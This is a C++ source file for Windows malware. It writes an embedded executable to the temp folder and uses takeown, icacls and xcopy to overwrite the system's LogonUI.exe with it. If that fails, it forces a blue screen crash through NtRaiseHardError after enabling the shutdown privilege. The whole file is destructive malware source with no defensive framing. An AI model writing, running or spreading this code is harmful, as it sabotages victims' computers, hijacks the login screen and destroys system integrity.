#include <windows.h>
#include <winternl.h>
#include <shellapi.h>
#include <string>
#include <fstream>
#include "logonBytes.h"
#include "logon.hpp"

using RtlAdjustPrivilege_t = NTSTATUS(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

using NtRaiseHardError_t = NTSTATUS(NTAPI*)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

wchar_t username[256];
DWORD size = sizeof(username) / sizeof(wchar_t);

std::string temp()
{
    char buffer[MAX_PATH];
    GetTempPathA(MAX_PATH, buffer);
    return std::string(buffer);
}

void boii(){ // blue screen of death
    BOOLEAN bEnabled;
    ULONG uResp;

    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    auto RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    auto NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(hNtdll, "NtRaiseHardError");

    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);

    NtRaiseHardError(0xc0000022, 0, 0, NULL, 6, &uResp);
}

bool reconstruct(const std::string& path, const unsigned char* data, size_t size)
{
    std::ofstream file(path, std::ios::binary);
    if (!file) return false;

    file.write(reinterpret_cast<const char*>(data), size);
    return true;
}

void overwritelogon()
{
    const char* username = std::getenv("USERNAME");
    std::string path = temp() + "hgvcujlogon.exe";
    printf(path.c_str());
    if (reconstruct(path, hgvcuj_logon_exe, hgvcuj_logon_exe_len))
    {
        std::string cmd1 = "/c takeown /f \"C:\\Windows\\System32\\LogonUI.exe\" && icacls \"C:\\Windows\\System32\\LogonUI.exe\" /grant \"" + std::string(username) + "\":F && xcopy \"" + path + "\" \"C:\\Windows\\System32\\LogonUI.exe\" /Y";
        ShellExecuteA(
        NULL, 
        "open", 
        "cmd.exe", 
        cmd1.c_str(), 
        NULL, 
        SW_SHOWNORMAL
    );
    }
    else
    {
        boii();
    }
}